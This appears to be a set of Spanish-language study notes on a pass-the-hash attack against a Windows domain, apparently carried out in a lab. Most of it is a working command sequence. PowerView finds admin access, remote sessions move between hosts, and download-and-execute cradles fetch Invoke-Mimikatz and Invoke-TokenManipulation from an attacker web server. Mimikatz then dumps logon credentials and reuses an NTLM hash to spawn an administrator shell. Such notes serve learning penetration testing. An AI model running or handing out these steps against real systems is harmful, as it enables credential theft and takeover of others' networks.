
Es una técnica de robo de credenciales basada en sistemas windows. Este ataque consiste en obtener el hash de la passwd de un usaurio para autenticarse como ese usuario.

El ataque suele empezar teniendo acceso al systema comprometido donde el usuario a almacenado el hash de su passwd. Una vez el hash es obtenido el atacante explota la vulnerabilidad en el protocolo de autenticación de windows.

Este ataque no requiere crackear el hash.

Ejemplo práctico:

```powershell
cd C:\tools
. .\PowerView.ps1
Get-Domain
```

![[Pasted image 20250401085755.png]]

```powershell
Find-LocalAdminAccess
# la respuesta es seclogs.research.SECURITY.local

Enter-PSSession seclogs.research.SECURITY.local
#Entramos en el dominio

#vemos los privs
whoami /all
```

![[Pasted image 20250401090010.png]]

Ejecutamos el web server de hfs y en la primera opción del ejecutable decimos que no.

![[Pasted image 20250401090057.png]]

En el apartado de add files añadimos:

- Invoke-Mimikatz.ps1
- Invoke-TokenManipulation.ps1

```powershell
#La ip es la del recuadro anterior
iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-TokenManipulation.ps1')

#enumera todos los tokens posbiles.
Invoke-TokenManipulation -Enumerate
```

![[Pasted image 20250401090428.png]]

```powershell
iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')

Invoke-Mimikatz -Command '"privilege::debug" "token:elevate" "sekurlsa::logonpasswords'
```

![[Pasted image 20250401090613.png]]


Ejecutamos un powershell como administrador.

```powershell
cd C:\\
cd .\Tools
powershell -ep bypass
. .\Invoke-Mimikatz-ps1

#Cambiar el hash por el correcto.
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.SECURITY.local /ntlm:hash /run:powershell.exe'
```

Esto lo que hace es generar un nuevo powershell pero con otro usuario.

```powershell
Enter-PSSession prod.research.SECURITY.local
hostname
```

![[Pasted image 20250401091328.png]]


